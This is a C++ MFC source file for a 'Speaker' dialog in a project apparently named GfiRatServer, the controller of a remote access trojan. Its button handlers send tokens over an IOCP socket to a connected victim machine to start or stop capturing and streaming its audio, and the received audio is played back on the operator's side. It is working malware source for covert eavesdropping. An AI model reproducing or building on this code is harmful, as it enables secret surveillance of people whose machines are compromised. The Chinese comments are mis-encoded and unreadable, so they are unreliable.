// AudioDlg.cpp : ʵ���ļ�
//

#include "pch.h"
#include "GfiRatServer.h"
#include "SpeakerDlg.h"
#include "afxdialogex.h"


// CSpeakerDlg �Ի���

IMPLEMENT_DYNAMIC(CSpeakerDlg, CDialog)

CSpeakerDlg::CSpeakerDlg(CWnd* pParent, CIOCPServer* IOCPServer, ClientContext* ContextObject)
	: CDialog(CSpeakerDlg::IDD, pParent)
	, m_bSend(FALSE)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));  //����ͼ��
	m_bIsWorking = TRUE;
	m_bThreadRun = FALSE;
	m_iocpServer = IOCPServer;       //Ϊ��ĳ�Ա������ֵ
	m_ContextObject = ContextObject;
	m_hWorkThread = NULL;
	m_nTotalRecvBytes = 0;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));        //�õ����ض�ip
	int iClientAddressLen = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->m_Socket, (SOCKADDR*)&ClientAddress, &iClientAddressLen);

	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";
}

CSpeakerDlg::~CSpeakerDlg()
{
	m_bIsWorking = FALSE;
	while (m_bThreadRun)
		Sleep(50);
}

void CSpeakerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);

}


BEGIN_MESSAGE_MAP(CSpeakerDlg, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CSpeakerDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON3, &CSpeakerDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CSpeakerDlg::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON2, &CSpeakerDlg::OnBnClickedButton2)
END_MESSAGE_MAP()


// CSpeakerDlg ��Ϣ�������


BOOL CSpeakerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, FALSE);

	CString strString;
	strString.Format("%s - ����������", m_strIPAddress);
	SetWindowText(strString);

	//�����߳� �ж�CheckBox
	//m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	m_bThreadRun = m_hWorkThread ? TRUE : FALSE;


	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}



void CSpeakerDlg::OnReceiveComplete(void)
{
	TRACE(_T("m_bSend  %d  m_brec %d "), m_bSend, m_brec);
	m_nTotalRecvBytes += m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, strString);
	switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SPEAK_DATA:
	{
		SetSpeakerDate.PlayBuffer(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1), m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1);   //���Ų�������
		break; 
	}
	default:
		// ���䷢���쳣����
		break;
	}
}

void CSpeakerDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}
	
	CoUninitialize();
	CancelIo((HANDLE)m_ContextObject->m_Socket);
	closesocket(m_ContextObject->m_Socket);

	m_bIsWorking = FALSE;
	//WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();

}



void CSpeakerDlg::OnReceive()
{

}

//����
void CSpeakerDlg::OnBnClickedButton1()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	BYTE bToken = TOKEN_SPEAK_START;
		m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
		CoInitialize(NULL);
		SetSpeakerDate.Initialize();
		SetSpeakerDate.Start();
}

//�رռ���
void CSpeakerDlg::OnBnClickedButton3()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	BYTE bToken = TOKEN_SPEAK_STOP;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	CoUninitialize();

}

//����
void CSpeakerDlg::OnBnClickedButton4()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	BYTE bToken = TOKEN_SEND_SPEAK_START;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
	CoInitialize(NULL);
	GetSpeakerDate.Initialize(m_iocpServer, m_ContextObject);
	GetSpeakerDate.Start();
}

//ֹͣ����
void CSpeakerDlg::OnBnClickedButton2()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	BYTE bToken = TOKEN_SEND_SPEAK_STOP;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}
	CoUninitialize();
}
